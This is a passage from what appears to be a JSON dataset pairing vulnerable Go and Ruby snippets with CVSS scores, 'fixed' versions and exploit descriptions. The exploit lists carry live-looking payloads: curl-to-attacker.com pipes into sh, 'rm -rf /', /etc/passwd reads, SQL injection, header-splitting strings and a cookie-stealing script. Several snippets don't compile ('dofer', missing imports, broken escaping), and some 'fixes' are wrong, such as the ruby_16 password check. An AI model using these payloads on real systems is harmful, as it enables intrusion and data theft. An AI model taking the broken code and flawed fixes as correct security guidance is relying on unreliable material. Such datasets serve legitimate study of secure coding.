            "If X-Frame-Options is set to DENY, it prevents framing entirely but does not allow for same-origin framing which might be needed. Setting it to SAMEORIGIN allows framing only from the same origin, mitigating clickjacking risks more effectively.",
            "Attackers could use social engineering tactics to lure users to a site that contains a malicious iframe pointing to the vulnerable page."
        ]
    },
    "go_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n)\n\nfunc generateSessionID() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    return base64.URLEncoding.EncodeToString(b)\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        sessionID := generateSessionID()\n        cookie := &http.Cookie{\n            Name:  \"session_id\",\n            Value: sessionID,\n            Path:  \"/\",\n        }\n        http.SetCookie(w, cookie)\n        fmt.Fprintf(w, \"Logged in with session ID: %s\", sessionID)\n    } else {\n        fmt.Fprintln(w, \"Invalid request method\")\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n    \"github.com/gorilla/securecookie\"\n)\n\nvar cookieHandler = securecookie.New(securecookie.GenerateRandomKey(64), securecookie.GenerateRandomKey(32))\n\nfunc generateSessionID() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    return base64.URLEncoding.EncodeToString(b)\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        sessionID := generateSessionID()\n        encoded, err := cookieHandler.Encode(\"session_id\", sessionID)\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n        cookie := &http.Cookie{\n            Name:  \"session_id\",\n            Value: encoded,\n            Path:  \"/\",\n            HttpOnly: true,\n            Secure: true,\n            SameSite: http.SameSiteStrictMode,\n        }\n        http.SetCookie(w, cookie)\n        fmt.Fprintf(w, \"Logged in with session ID\")\n    } else {\n        fmt.Fprintln(w, \"Invalid request method\")\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServeTLS(\":8080\", \"cert.pem\", \"key.pem\", nil)\n}",
        "exploit_ways": [
            "An attacker could set a fixed session ID in the browser cookie and attempt to hijack an existing user's session.",
            "By exploiting predictable session IDs, attackers might guess or brute-force other valid session tokens.",
            "If combined with cross-site scripting (XSS), an attacker can steal a valid session cookie from another user."
        ]
    },
    "go_39": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype ResponseSplitter struct {\n}\n\nfunc (r *ResponseSplitter) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n\tparam := req.URL.Query().Get(\"param\")\n\tw.Header().Set(\"Custom-Header\", param)\n\tfmt.Fprintf(w, \"Parameter: %s\", param)\n}\n\nfunc main() {\n\thttp.Handle(\"/\", &ResponseSplitter{})\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\ntype ResponseSplitter struct {\n}\n\nfunc (r *ResponseSplitter) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n\tparam := url.QueryEscape(req.URL.Query().Get(\"param\"))\n\tw.Header().Set(\"Custom-Header\", param)\n\tfmt.Fprintf(w, \"Parameter: %s\", param)\n}\n\nfunc main() {\n\thttp.Handle(\"/\", &ResponseSplitter{})\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject 'param=\\r\\nSet-Cookie: MaliciousCookie=Hacked' to manipulate headers.",
            "They could use 'param=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html><h1>Hacked</h1></html>' to inject a fake response.",
            "Injecting 'param=\\r\\nLocation: http://malicious-site.com' could redirect victims to another site."
        ]
    },
    "go_40": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    w.Header().Set(\"X-Custom-Header\", name)\n    fmt.Fprintf(w, \"Hello, %s!\", name)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", vulnerableHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 4.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n)\n\nfunc safeHandler(w http.ResponseWriter, r *http.Request) {\n    name := url.PathEscape(r.URL.Query().Get(\"name\"))\n    w.Header().Set(\"X-Custom-Header\", name)\n    fmt.Fprintf(w, \"Hello, %s!\", name)\n}\n\nfunc main() {\n    http.HandleFunc(\"/greet\", safeHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to set a malicious cookie.",
            "They could use '\\r\\nContent-Length: 0\\r\\nConnection: close' to prematurely end the response.",
            "Input like '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><script>alert(\\x27XSS\\x27)</script></html>' can inject a script."
        ]
    },
    "go_41": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"strings\\\"\n)\n\nfunc sessionHandler(w http.ResponseWriter, r *http.Request) {\n\tsessionID := r.URL.Query().Get(\\\"session_id\\\")\n\tif sessionID != \\\"\\\" {\n\t\tcookie := &http.Cookie{\n\t\t\tName:     \\\\\"session\\\\\",\n\t\t\tValue:    sessionID,\n\t\t\tPath:     \\\\\"/\\\\\",\n\t\t\tHttpOnly: true,\n\t\t}\n\t\thttp.SetCookie(w, cookie)\n\t}\n\tfmt.Fprintf(w, \\\\\"Session handled\\\\\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\\\"/session\\\", sessionHandler)\n\thttp.ListenAndServe(:8080, nil)\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"crypto/rand\\\"\n\t\\\"encoding/base64\\\"\n)\n\nfunc generateSessionID() (string, error) {\n\tb := make([]byte, 32)\n\t_, err := rand.Read(b)\n\tif err != nil {\n\t\treturn \\\"\\\", err\n\t}\n\treturn base64.StdEncoding.EncodeToString(b), nil\n}\n\nfunc sessionHandler(w http.ResponseWriter, r *http.Request) {\n\tsessionID, _ := generateSessionID()\n\tcookie := &http.Cookie{\n\t\tName:     \\\\\"session\\\\\",\n\t\tValue:    sessionID,\n\t\tPath:     \\\\\"/\\\\\",\n\t\tHttpOnly: true,\n\t}\n\thttp.SetCookie(w, cookie)\n\tfmt.Fprintf(w, \\\\\"Session handled\\\\\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\\\"/session\\\", sessionHandler)\n\thttp.ListenAndServe(:8080, nil)\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By using a crafted URL with a specific session_id parameter, an attacker could force a user into a malicious session.",
            "The vulnerability allows for potential privilege escalation if the attacker can control the session content."
        ]
    },
    "go_42": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nvar counter int = 0\n\ntype SafeCounter struct {\n\tv   map[string]int\n\tmux sync.Mutex\n}\n\nfunc (c *SafeCounter) Inc(key string) {\n\tc.mux.Lock()\n\tdofer c.mux.Unlock()\n\tc.v[key]++\n}\n\nfunc (c *SafeCounter) Value(key string) int {\n\tc.mux.Lock()\n\tdofer c.mux.Unlock()\n\treturn c.v[key]\n}\n\nfunc worker(c *SafeCounter, id int) {\n\tfor i := 0; i < 1000; i++ {\n\t\t// Race condition is intentionally left in the following line\n\t\tcounter++\n\t\ttime.Sleep(1 * time.Nanosecond)\n\t}\n\tfmt.Printf(\"Worker %d done\\n\", id)\n}\n\nfunc main() {\n\tc := SafeCounter{v: make(map[string]int)}\n\tfor i := 0; i < 10; i++ {\n\t\tgo worker(&c, i)\n\t}\n\ttime.Sleep(2 * time.Second)\n\tfmt.Println(\"Final counter value:\", counter)\n}",
        "cvss_score": 4.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\n\nvar counter int = 0\nvar mutex sync.Mutex\n\ntype SafeCounter struct {\n\tv   map[string]int\n\tmux sync.Mutex\n}\n\nfunc (c *SafeCounter) Inc(key string) {\n\tc.mux.Lock()\n\tdefer c.mux.Unlock()\n\tc.v[key]++\n}\n\nfunc (c *SafeCounter) Value(key string) int {\n\tc.mux.Lock()\n\tdefer c.mux.Unlock()\n\treturn c.v[key]\n}\n\nfunc worker(c *SafeCounter, id int) {\n\tfor i := 0; i < 1000; i++ {\n\t\tmutex.Lock()\n\t\tcounter++\n\t\tmutex.Unlock()\n\t\ttime.Sleep(1 * time.Nanosecond)\n\t}\n\tfmt.Printf(\"Worker %d done\\n\", id)\n}\n\nfunc main() {\n\tc := SafeCounter{v: make(map[string]int)}\n\tfor i := 0; i < 10; i++ {\n\t\tgo worker(&c, i)\n\t}\n\ttime.Sleep(2 * time.Second)\n\tfmt.Println(\"Final counter value:\", counter)\n}",
        "exploit_ways": [
            "An attacker could cause the program to enter a deadlock by creating many goroutines that continuously try to increment the shared variable.",
            "By carefully timing inputs, an attacker might exploit this race condition to force the counter into unexpected states, potentially affecting other logic dependent on it.",
            "If part of a larger system, inconsistent state updates due to race conditions could lead to data corruption or service instability."
        ]
    },
    "go_43": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"Hello, World!\"))\n}",
        "cvss_score": 2.8,
        "fixed_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc secureHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    w.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n    w.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n    w.Write([]byte(\"Hello, World!\"))\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts if the application is vulnerable to XSS.",
            "Clickjacking attacks might be possible due to lack of X-Frame-Options header.",
            "Sensitive information may be leaked through MIME type sniffing as X-Content-Type-Options header is missing."
        ]
    },
    "go_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\nglobalVar int = 0\n\nfunc increment() {\n\tlocalVar := globalVar\n\ttime.Sleep(1 * time.Nanosecond)\t// Simulate some processing delay\n\tglobalVar = localVar + 1\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(2 * time.Millisecond) // Wait for all goroutines to finish\n\tfmt.Println(globalVar)\t// Expected 1000, but might print less due to race condition\n}",
        "cvss_score": 4.6,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\nglobalVar int = 0\nvar mu sync.Mutex\n\nfunc increment() {\n\tmu.Lock()\n\tlocalVar := globalVar\n\ttime.Sleep(1 * time.Nanosecond)\t// Simulate some processing delay\n\tglobalVar = localVar + 1\n\tmu.Unlock()\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(2 * time.Millisecond) // Wait for all goroutines to finish\n\tfmt.Println(globalVar)\t// Expected and will print 1000\n}",
        "exploit_ways": [
            "An attacker could force the race condition to occur by manipulating system load, causing incorrect increments.",
            "By timing attacks, an adversary might predict when the global variable is being updated, leading to inconsistent state.",
            "Race conditions can lead to data corruption in more complex systems, making it difficult to debug and secure without proper synchronization."
        ]
    },
    "go_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    w.Header().Set(\"Location\", \"/greet?name=\"+name)\n    w.WriteHeader(http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", handler)\n    fmt.Println(\"Server starting...\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    encodedName := url.PathEscape(name)\n    w.Header().Set(\"Location\", \"/greet?name=\"+encodedName)\n    w.WriteHeader(http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", handler)\n    fmt.Println(\"Server starting...\")\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to manipulate cookies.",
            "They can use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Exploit</h1>' to deliver a fake response.",
            "Input like '\\r\\nLocation: http://attacker.com' can redirect users to a malicious site."
        ]
    },
    "go_46": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    var filename string\n    fmt.Print(\"Enter file name to read:\")\n    fmt.Scan(&filename)\n    data, _ := os.ReadFile(filename)\n    fmt.Println(string(data))\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\nfunc main() {\n    var filename string\n    fmt.Print(\"Enter file name to read:\")\n    fmt.Scan(&filename)\n    \ncleanFilename := filepath.Clean(filename)\nif !strings.HasPrefix(cleanFilename, \".\") {\n        data, err := os.ReadFile(cleanFilename)\n        if err != nil {\n            fmt.Println(\"Error reading file\", err)\n            return\n        }\n        fmt.Println(string(data))\n    } else {\n        fmt.Println(\"Access denied\")\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read sensitive system files.",
            "They might try \"..\\config.txt\" on Windows systems to access configuration files.",
            "Using \"./secret_data\" could lead to unauthorized disclosure of internal application data."
        ]
    },
    "go_47": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc vulnerableFunction() {\n\tfor {\n\t\tfmt.Println(\"Running...\")\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}",
        "cvss_score": 4.2,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc safeFunction() {\n\tsigChan := make(chan os.Signal, 1)\n\tsignal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)\n\tfor {\n\t\tselect {\n\t\tcase <-sigChan:\n\t\t\tfmt.Println(\"Shutting down...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(\"Running...\")\n\t\t\ttime.Sleep(1 * time.Second)\n\t\t}\n\t}\n}",
        "exploit_ways": [
            "An attacker can start the function, causing a continuous loop that consumes resources indefinitely.",
            "The loop can be triggered multiple times to exacerbate resource usage and slow down the system.",
            "By filling up the server with requests triggering this function, an attacker can cause performance degradation."
        ]
    },
    "go_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    for {\n        fmt.Println(\"Running...\")\n        time.Sleep(1 * time.Second)\n    }\n}",
        "cvss_score": 4.0,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    for i := 0; i < 60; i++ {\n        fmt.Println(\"Running...\")\n        time.Sleep(1 * time.Second)\n    }\n}",
        "exploit_ways": [
            "An attacker can run this program to consume CPU resources indefinitely, leading to a low-impact denial of service.",
            "The program could be scheduled or triggered in large numbers to degrade the performance of the server or system it's running on.",
            "If part of a larger application, this loop could prevent other functionalities from executing properly."
        ]
    },
    "ruby_0": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "require 'sqlite3'\n\ndef get_user_by_id(id)\n    db = SQLite3::Database.new \"/path/to/database.db\"\n    result = db.execute \"SELECT * FROM users WHERE id = #{id}\";\n    return result\nend",
        "cvss_score": 7.5,
        "fixed_code": "require 'sqlite3'\ndef get_user_by_id(id)\n    db = SQLite3::Database.new \"/path/to/database.db\"\n    result = db.execute \"SELECT * FROM users WHERE id = ?\", id\n    return result\nend",
        "exploit_ways": [
            "An attacker could input '1 OR 1=1' to retrieve all user records.",
            "A crafted ID like '1; DROP TABLE users' could be used to delete the users table.",
            "Inputting '1 UNION SELECT username, password FROM users' can extract sensitive information."
        ]
    },
    "ruby_1": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class BufferOverflowExample\n  def unsafe_method(input)\n    buffer = \"A\" * 100 + input\n    puts buffer\n  end\nend",
        "cvss_score": 7.5,
        "fixed_code": "class BufferOverflowExample\n  def safe_method(input)\n    max_length = 150\n    truncated_input = input[0, max_length]\n    buffer = \"A\" * 100 + truncated_input\n    puts buffer\n  end\nend",
        "exploit_ways": [
            "An attacker could provide an excessively long string to overwrite adjacent memory and potentially execute arbitrary code.",
            "By injecting a carefully crafted payload, the attacker may alter program execution flow leading to unauthorized actions or crashes.",
            "Overflow can be used to corrupt data on the stack, potentially causing the application to crash or behave unpredictably."
        ]
    },
    "ruby_2": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class UserController < ApplicationController\n  def update\n    @user = User.find(params[:id])\n    if @user.update(user_params)\n      redirect_to @user, notice: 'User was successfully updated.'\n    else\n      render :edit\n    end\n  end\n\n  private\n\n  def user_params\n    params.require(:user).permit(:name, :email)\n  end\nend",
        "cvss_score": 7.5,
        "fixed_code": "class UserController < ApplicationController\n  before_action :verify_authenticity_token\n\n  def update\n    @user = User.find(params[:id])\n    if @user.update(user_params)\n      redirect_to @user, notice: 'User was successfully updated.'\n    else\n      render :edit\n    end\n  end\n\n  private\n\n  def user_params\n    params.require(:user).permit(:name, :email)\n  end\nend",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, updates the user's details without their consent.",
            "Using CSRF, an attacker could change the email address of a victim to take over their account.",
            "CSRF attack could be used to promote a regular user to an admin, giving them elevated privileges."
        ]
    },
    "ruby_3": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "require 'net/http'\ndef fetch_and_eval(url)\n  response = Net::HTTP.get(URI.parse(url))\n  eval(response)\nend",
        "cvss_score": 8.5,
        "fixed_code": "require 'net/http'\ndef fetch_and_sanitize(url)\n  response = Net::HTTP.get(URI.parse(url))\n  # Implement safe parsing or validation here\n  puts response\nend",
        "exploit_ways": [
            "An attacker can host a URL that returns malicious Ruby code to execute on the server.",
            "Could exploit this to perform unauthorized actions such as deleting files or accessing sensitive data.",
            "Attacker could use this to install backdoors or launch further attacks by executing system commands through injected Ruby code."
        ]
    },
    "ruby_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "puts `#{gets.chomp}`",
        "cvss_score": 7.5,
        "fixed_code": "user_input = gets.chomp\ncmd = ['echo', user_input]\nputs IO.popen(cmd).read",
        "exploit_ways": [
            "An attacker can input '; rm -rf /' to delete all files.",
            "They could use '; curl attacker.com/shell.sh | sh' to download and execute a shell script.",
            "Input like '; cat /etc/passwd' can leak system's user credentials."
        ]
    },
    "ruby_5": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "class AdminPanel\n  def initialize(user)\n    @user = user\n  end\n\n  def grant_admin\n    if @user.secret_code == 'secret'\n      @user.admin = true\n    end\n  end\nend\nclass User\n  attr_accessor :admin, :secret_code\n  def initialize(secret_code)\n    @secret_code = secret_code\n    @admin = false\n  end\nend",
        "cvss_score": 7.2,
        "fixed_code": "class AdminPanel\n  def initialize(user)\n    @user = user\n  end\n\n  def grant_admin\n    if @user.secret_code == ENV['ADMIN_SECRET_CODE']\n      @user.admin = true\n    end\n  end\nend\nclass User\n  attr_accessor :admin, :secret_code\n  def initialize(secret_code)\n    @secret_code = secret_code\n    @admin = false\n  end\nend",
        "exploit_ways": [
            "An attacker can guess or brute-force the 'secret' code to gain admin privileges.",
            "If the code is shared or stored insecurely, an attacker can find the hardcoded secret and escalate their access.",
            "Using a weak secret code like 'secret' allows trivial exploitation by attackers."
        ]
    },
    "ruby_6": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "require 'net/http'\n\nputs 'Enter URL:'\nurl = gets.chomp\nresponse = Net::HTTP.get(URI(url))\neval(response)",
        "cvss_score": 8.2,
        "fixed_code": "require 'net/http'\n\nputs 'Enter URL:'\nurl = gets.chomp\nbegin\n  uri = URI(url)\n  response = Net::HTTP.get(uri)\n  puts 'Response received, but not executing.'\nrescue URI::InvalidURIError => e\n  puts \"Invalid URL: #{e.message}\"\nend",
        "exploit_ways": [
            "An attacker could host a malicious script that, when executed, performs unauthorized actions on the server.",
            "By providing a crafted URL, an attacker can exploit this to execute commands or modify files on the server remotely.",
            "The vulnerability allows for remote code execution which can lead to full system compromise if not properly secured."
        ]
    },
    "ruby_8": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "require 'yaml'\ndef load_user_data(file_path)\n  YAML.load(File.read(file_path))\nend\nputs load_user_data(ARGV[0])",
        "cvss_score": 7.5,
        "fixed_code": "require 'yaml'\ndef load_user_data(file_path)\n  YAML.safe_load(File.read(file_path), permitted_classes: [Time, Symbol, Date])\nend\nputs load_user_data(ARGV[0])",
        "exploit_ways": [
            "An attacker can inject malicious YAML to execute arbitrary code upon deserialization.",
            "The vulnerability can be exploited by crafting a YAML payload that defines an object with custom initialization logic that is executed when loaded.",
            "Attackers could use this vulnerability to perform privilege escalation by injecting serialized objects that manipulate system settings or credentials."
        ]
    },
    "ruby_9": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "require 'socket'\ndef process_input(input)\n  buffer = \"A\" * 1024\n  buffer[0, input.length] = input\n  puts buffer\nend\ns = TCPServer.open(2000) { |serv|\n  serv.accept { |client|\n    while line = client.gets\n      process_input(line)\n    end\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "require 'socket'\ndef process_input(input)\n  max_length = 1024\n  input = input[0, max_length]\n  buffer = \"A\" * max_length\n  buffer[0, input.length] = input\n  puts buffer\nend\ns = TCPServer.open(2000) { |serv|\n  serv.accept { |client|\n    while line = client.gets\n      process_input(line)\n    end\n  }\n}",
        "exploit_ways": [
            "An attacker can send a string longer than 1024 characters to overflow the buffer and potentially overwrite return addresses.",
            "Overflow could lead to arbitrary code execution if crafted carefully, allowing attackers to run malicious commands on the server.",
            "Overwriting stack variables might be possible, leading to unauthorized access or denial of service."
        ]
    },
    "ruby_10": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "require 'sinatra'\n\nget '/search' do\n  query = params[:query]\n  db = SQLite3::Database.new \"/var/www/myapp/db/development.sqlite3\"\n  results = db.execute \"SELECT * FROM users WHERE name LIKE '%#{query}%'\"\n  results.to_s\nend",
        "cvss_score": 8.8,
        "fixed_code": "require 'sinatra'\n\nget '/search' do\n  query = params[:query]\n  db = SQLite3::Database.new \"/var/www/myapp/db/development.sqlite3\"\n  results = db.execute \"SELECT * FROM users WHERE name LIKE ?\", \"%#{query}%\"\n  results.to_s\nend",
        "exploit_ways": [
            "An attacker could input '% OR '1'='1 to retrieve all records from the users table.",
            "Using '% UNION SELECT username, password FROM admin_users --",
            "Inputting '%; DROP TABLE users"
        ]
    },
    "ruby_11": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "def render_user_input(user_input)\n  sanitized = user_input.gsub(/</, '&lt;').gsub(/>/, '&gt;')\n  \"<div>#{sanitized}</div>\"\nend\n\nuser_data = params[:data]\necho_html(render_user_input(user_data))",
        "cvss_score": 7.5,
        "fixed_code": "def render_user_input(user_input)\n  sanitized = CGI.escapeHTML(user_input)\n  \"<div>#{sanitized}</div>\"\nend\n\nuser_data = params[:data]\necho_html(render_user_input(user_data))",
        "exploit_ways": [
            "An attacker could inject a script tag to steal cookies: \\<script\\>document.location='http://attacker.com/steal?cookie='+document.cookie;\\<\\/script\\>",
            "Could use the injected script to perform actions on behalf of the user by manipulating DOM or making AJAX requests.",
            "Injecting scripts that open popups or redirects can cause denial-of-service attacks by repeatedly showing dialogs."
        ]
    },
    "ruby_12": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "class UnsafeEvaluator\ndef initialize(input)\n  @input = input\nend\n\ndef evaluate\n  instance_eval(@input)\nend\nend",
        "cvss_score": 7.5,
        "fixed_code": "class SafeEvaluator\ndef initialize(input)\n  @input = input\nend\n\ndef evaluate\n  # No longer using instance_eval which can execute arbitrary code\n  return nil unless @input.match?(/^[a-z0-9._]+$/i)\n  method(@input).call if respond_to?(@input, true)\nend\nend",
        "exploit_ways": [
            "An attacker could input 'system(\"rm -rf /\")' to delete all files on the server.",
            "They might use 'send(:eval, \"puts 'hacked'\")' to execute arbitrary Ruby code.",
            "Could inject a call to external services with 'Net::HTTP.get(URI('http://attacker.com'))'"
        ]
    },
    "ruby_13": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "# Ruby example\ndef unsafe_command(input)\n    system(input)\nend\nunsafe_command(gets.chomp)",
        "cvss_score": 7.2,
        "fixed_code": "# Ruby example\ndef safe_command(command)\n    allowed_commands = ['ls', 'whoami']\n    if allowed_commands.include?(command)\n        system(\"#{command}\")\n    else\n        puts \"Command not allowed\"\n    end\nend\nsafe_command(gets.chomp)",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "ruby_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "class WebPage\n  def render(user_input)\n    \"<div>#{user_input}</div>\"\n  end\nend",
        "cvss_score": 7.5,
        "fixed_code": "class WebPage\n  def render(user_input)\n    sanitized_input = ERB::Util.h(user_input)\n    \"<div>#{sanitized_input}</div>\"\n  end\nend",
        "exploit_ways": [
            "An attacker can inject a script tag like '<script>alert(\\\"XSS\\\");</script>' to execute JavaScript in the user's browser.",
            "Could use '<img src=x onerror=alert(1)>' to trigger an alert, potentially stealing cookies or other sensitive information.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click me</a>' could deceive users into clicking a link that executes malicious JavaScript."
        ]
    },
    "ruby_15": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def authenticate(user, pass)\n  stored_password = \"securepassword123\"\n  if user == \"admin\" && Digest::MD5.hexdigest(pass) == Digest::MD5.hexdigest(stored_password)\n    return true\n  else\n    return false\n  end\nend",
        "cvss_score": 8.0,
        "fixed_code": "require 'bcrypt'\ndef authenticate(user, pass)\n  stored_password_hash = BCrypt::Password.create(\"securepassword123\")\n  if user == \"admin\" && BCrypt::Password.new(stored_password_hash) == pass\n    return true\n  else\n    return false\n  end\nend",
        "exploit_ways": [
            "An attacker could brute-force the password since it's a static hash.",
            "Using rainbow table attacks, an attacker might find the password if MD5 is compromised or weak.",
            "A developer mistake in handling user input could lead to alternative bypasses if combined with other flaws."
        ]
    },
    "ruby_16": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "require 'bcrypt'\nclass User\n  attr_accessor :username, :password_hash\n  def initialize(username, password)\n    @username = username\n    @password_hash = BCrypt::Password.create(password)\n  end\n  def self.authenticate(users, username, password)\n    user = users.find { |u| u.username == username }\n    if user && user.password_hash == BCrypt::Password.new(password)\n      return true\n    else\n      return false\n    end\n  end\nend\nusers = [User.new('admin', 'secretpassword'), User.new('user', 'password123')]\nputs 'Enter username:'\nusername = gets.chomp\nputs 'Enter password:'\npassword = gets.chomp\nif User.authenticate(users, username, password)\n  puts 'Authentication successful.'\nelse\n  puts 'Authentication failed.'\nend",
        "cvss_score": 7.5,
        "fixed_code": "require 'bcrypt'\nclass User\n  attr_accessor :username, :password_hash\n  def initialize(username, password)\n    @username = username\n    @password_hash = BCrypt::Password.create(password)\n  end\n  def self.authenticate(users, username, password)\n    user = users.find { |u| u.username == username }\n    if user && user.password_hash == password\n      return true\n    else\n      return false\n    end\n  end\nend\nusers = [User.new('admin', 'secretpassword'), User.new('user', 'password123')]\nputs 'Enter username:'\nusername = gets.chomp\nputs 'Enter password:'\npassword = gets.chomp\nif User.authenticate(users, username, password)\n  puts 'Authentication successful.'\nelse\n  puts 'Authentication failed.'\nend",
        "exploit_ways": [
            "An attacker could use brute force to guess common passwords.",
            "If the list of users is known, an attacker could try default or weak passwords for each user.",
            "Timing attacks can be used to infer if a username exists and if the password is correct based on response times."
        ]
    },
    "ruby_17": {
        "vulnerability_type": "Buffer Overflow",
